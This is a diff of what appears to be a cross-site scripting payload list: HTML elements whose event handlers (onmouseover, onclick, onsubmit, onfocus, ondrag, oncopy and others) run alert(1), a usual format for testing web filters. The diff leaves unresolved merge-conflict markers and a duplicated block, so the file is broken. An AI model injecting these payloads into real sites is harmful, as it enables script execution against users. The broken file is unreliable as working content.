@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 <a onmouseover=alert(1)>Hover me</a>
 <button onclick=alert(1)>Click me</button>
 <input onchange=alert(1) value=xss>
@@ -9,4 +10,17 @@
 <input onkeyup=alert(1)>
 <xss onclick="alert(1)" style=display:block>test</xss>
 <xss ondrag=alert(1) draggable="true" style=display:block>Drag me</xss>
+=======
+<a onmouseover=alert(1)>Hover me</a>
+<button onclick=alert(1)>Click me</button>
+<input onchange=alert(1) value=xss>
+<form onsubmit=alert(1)><input type=submit></form>
+<a onfocus=alert(1) tabindex=1 id=x></a>
+<div oncontextmenu=alert(1)>Right click me</div>
+<input onkeydown=alert(1)>
+<input onkeypress=alert(1)>
+<input onkeyup=alert(1)>
+<xss onclick="alert(1)" style=display:block>test</xss>
+<xss ondrag=alert(1) draggable="true" style=display:block>Drag me</xss>
+>>>>>>> master
 <xss oncopy=alert(1) value="XSS" autofocus tabindex=1>Copy me</xss>
